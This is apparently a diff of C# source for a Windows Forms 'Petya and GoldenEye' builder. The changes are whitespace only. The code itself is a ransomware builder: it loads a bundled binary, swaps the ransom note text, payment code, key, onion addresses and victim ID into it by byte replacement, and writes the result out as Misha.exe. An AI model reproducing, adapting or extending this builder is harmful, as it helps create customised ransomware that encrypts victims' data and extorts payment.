@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.ComponentModel;
 using System.Drawing;
 using System.IO;
@@ -11,22 +11,22 @@ namespace Petya_and_GoldenEye_BUILDER
 {
 	public partial class Form1 : Form
 	{
-        private string mihabin;
-        private string m_origname;
-        private string m_origmain;
-        private string m_origcode;
-        private string m_origif;
-        private string m_origkey;
-        private string m_onion1;
-        private string m_onion2;
-        private string m_id;
+        	private string mihabin;
+		private string m_origname;
+		private string m_origmain;
+		private string m_origcode;
+		private string m_origif;
+		private string m_origkey;
+		private string m_onion1;
+		private string m_onion2;
+		private string m_id;
 
-        private void Form1_Load(object sender, EventArgs e)
-        {
-            this.LoadOrig();
-            this.InstallFiles();
-            this.GetFilePaths();
-        }
+		private void Form1_Load(object sender, EventArgs e)
+		{
+		    this.LoadOrig();
+		    this.InstallFiles();
+		    this.GetFilePaths();
+		}
 
 		public Form1()
 		{
@@ -40,7 +40,7 @@ namespace Petya_and_GoldenEye_BUILDER
         
 		public void ReplaceMethod()
 		{
-            if (this.textBox5.Text.Length < this.m_origname.Length)
+            		if (this.textBox5.Text.Length < this.m_origname.Length)
 			{
 				string text = this.textBox5.Text;
 				for (int i = 0; i < this.m_origname.Length - this.textBox5.Text.Length; i++)
@@ -50,7 +50,7 @@ namespace Petya_and_GoldenEye_BUILDER
 				this.textBox5.Text = text;
 			}
 
-            if (this.textBox7.Text.Length < this.m_origcode.Length)
+            		if (this.textBox7.Text.Length < this.m_origcode.Length)
 			{
 				string text2 = this.textBox7.Text;
 				for (int j = 0; j < this.m_origcode.Length - this.textBox7.Text.Length; j++)
@@ -60,7 +60,7 @@ namespace Petya_and_GoldenEye_BUILDER
 				this.textBox7.Text = text2;
 			}
 
-            if (this.textBox8.Text.Length < this.m_origif.Length)
+            		if (this.textBox8.Text.Length < this.m_origif.Length)
 			{
 				string text3 = this.textBox8.Text;
 				for (int k = 0; k < this.m_origif.Length - this.textBox8.Text.Length; k++)
@@ -70,7 +70,7 @@ namespace Petya_and_GoldenEye_BUILDER
 				this.textBox8.Text = text3;
 			}
 
-            if (this.textBox9.Text.Length < this.m_origkey.Length)
+            		if (this.textBox9.Text.Length < this.m_origkey.Length)
 			{
 				string text4 = this.textBox9.Text;
 				for (int l = 0; l < this.m_origkey.Length - this.textBox9.Text.Length; l++)
@@ -80,7 +80,7 @@ namespace Petya_and_GoldenEye_BUILDER
 				this.textBox9.Text = text4;
 			}
 
-            if (this.textBox1.Text.Length < this.m_onion1.Length)
+            		if (this.textBox1.Text.Length < this.m_onion1.Length)
 			{
 				string text5 = this.textBox1.Text;
 				for (int m = 0; m < this.m_onion1.Length - this.textBox1.Text.Length; m++)
@@ -90,7 +90,7 @@ namespace Petya_and_GoldenEye_BUILDER
 				this.textBox1.Text = text5;
 			}
 
-            if (this.textBox2.Text.Length < this.m_onion2.Length)
+            		if (this.textBox2.Text.Length < this.m_onion2.Length)
 			{
 				string text6 = this.textBox2.Text;
 				for (int n = 0; n < this.m_onion2.Length - this.textBox2.Text.Length; n++)
@@ -100,7 +100,7 @@ namespace Petya_and_GoldenEye_BUILDER
 				this.textBox2.Text = text6;
 			}
 
-            if (this.textBox3.Text.Length < this.m_id.Length)
+            		if (this.textBox3.Text.Length < this.m_id.Length)
 			{
 				string text7 = this.textBox3.Text;
 				for (int num = 0; num < this.m_id.Length - this.textBox3.Text.Length; num++)
@@ -138,7 +138,7 @@ namespace Petya_and_GoldenEye_BUILDER
 				this.textBox6.Text = text9;
 			}
             
-            // The actual edit.
+            		// The actual edit.
 			this.ReplaceTextInFile(this.mihabin, this.m_origname, this.textBox5.Text);
 			this.ReplaceTextInFile(this.mihabin, this.m_origmain, this.textBox6.Text);
 			this.ReplaceTextInFile(this.mihabin, this.m_origcode, this.textBox7.Text);
@@ -148,7 +148,7 @@ namespace Petya_and_GoldenEye_BUILDER
 			this.ReplaceTextInFile(this.mihabin, this.m_onion2,   this.textBox2.Text);
 			this.ReplaceTextInFile(this.mihabin, this.m_id, 	  this.textBox3.Text);
             
-            // Reset all text.
+            		// Reset all text.
 			this.textBox1.Text = this.m_onion1;
 			this.textBox2.Text = this.m_onion2;
 			this.textBox3.Text = this.m_id;
@@ -161,9 +161,9 @@ namespace Petya_and_GoldenEye_BUILDER
 
 		private void button1_Click(object sender, EventArgs e)
 		{
-            if (this.checkBox1.Checked) // I pinky swear.
+            		if (this.checkBox1.Checked) // I pinky swear.
 			{
-                if (File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe"))
+                		if (File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe"))
 				{
 					File.Delete(Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe");
 				}
@@ -172,9 +172,9 @@ namespace Petya_and_GoldenEye_BUILDER
 				this.ReplaceMethod();
 
 				File.Move(this.mihabin, Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe");
-                this.RemoveFiles();
+                		this.RemoveFiles();
 				
-                MessageBox.Show("Done, path: " + Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe", "Successful.", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
+                		MessageBox.Show("Done, path: " + Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe", "Successful.", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
 			}
 			else
 			{
@@ -189,7 +189,7 @@ namespace Petya_and_GoldenEye_BUILDER
 			byte[] bytes2 = Encoding.UTF8.GetBytes(newText);
 			int num = this.IndexOfBytes(array, bytes);
 			
-            bool flag = num < 0;
+            		bool flag = num < 0;
 			if (!flag)
 			{
 				byte[] array2 = new byte[array.Length + bytes2.Length - bytes.Length];
@@ -258,7 +258,7 @@ namespace Petya_and_GoldenEye_BUILDER
 		private void textBox5_TextChanged(object sender, EventArgs e)
 		{
 			this.label2.Text = this.textBox5.Text.Length + " of";
-            if (this.textBox5.Text.Length > 42)
+            		if (this.textBox5.Text.Length > 42)
 			{
 				this.textBox5.Text = this.textBox5.Text.Remove(this.textBox5.Text.Length - 1);
 			}
@@ -267,7 +267,7 @@ namespace Petya_and_GoldenEye_BUILDER
 		private void textBox6_TextChanged(object sender, EventArgs e)
 		{
 			this.label3.Text = this.textBox6.Text.Length + " of";
-            if (this.textBox6.Text.Length > 499)
+            		if (this.textBox6.Text.Length > 499)
 			{
 				this.textBox6.Text = this.textBox6.Text.Remove(this.textBox6.Text.Length - 1);
 			}
@@ -288,7 +288,7 @@ namespace Petya_and_GoldenEye_BUILDER
 			Label label = this.label5;
 			TextBox textBox = this.textBox8;
 			label.Text = textBox.Text.Length + " of";
-            if (textBox.Text.Length > 57)
+            		if (textBox.Text.Length > 57)
 			{
 				textBox.Text = textBox.Text.Remove(textBox.Text.Length - 1);
 			}
@@ -299,7 +299,7 @@ namespace Petya_and_GoldenEye_BUILDER
 			Label label = this.label7;
 			TextBox textBox = this.textBox9;
 			label.Text = textBox.Text.Length + " of";
-            if (textBox.Text.Length > 32)
+            		if (textBox.Text.Length > 32)
 			{
 				textBox.Text = textBox.Text.Remove(textBox.Text.Length - 1);
 			}
@@ -310,7 +310,7 @@ namespace Petya_and_GoldenEye_BUILDER
 			Label label = this.label14;
 			TextBox textBox = this.textBox1;
 			label.Text = textBox.Text.Length + " of";
-            if (textBox.Text.Length > 36)
+            		if (textBox.Text.Length > 36)
 			{
 				textBox.Text = textBox.Text.Remove(textBox.Text.Length - 1);
 			}
@@ -321,7 +321,7 @@ namespace Petya_and_GoldenEye_BUILDER
 			Label label = this.label6;
 			TextBox textBox = this.textBox2;
 			label.Text = textBox.Text.Length + " of";
-            if (textBox.Text.Length > 38)
+            		if (textBox.Text.Length > 38)
 			{
 				textBox.Text = textBox.Text.Remove(textBox.Text.Length - 1);
 			}
@@ -332,7 +332,7 @@ namespace Petya_and_GoldenEye_BUILDER
 			Label label = this.label16;
 			TextBox textBox = this.textBox3;
 			label.Text = textBox.Text.Length + " of";
-            if (textBox.Text.Length > 96)
+            		if (textBox.Text.Length > 96)
 			{
 				textBox.Text = textBox.Text.Remove(textBox.Text.Length - 1);
 			}
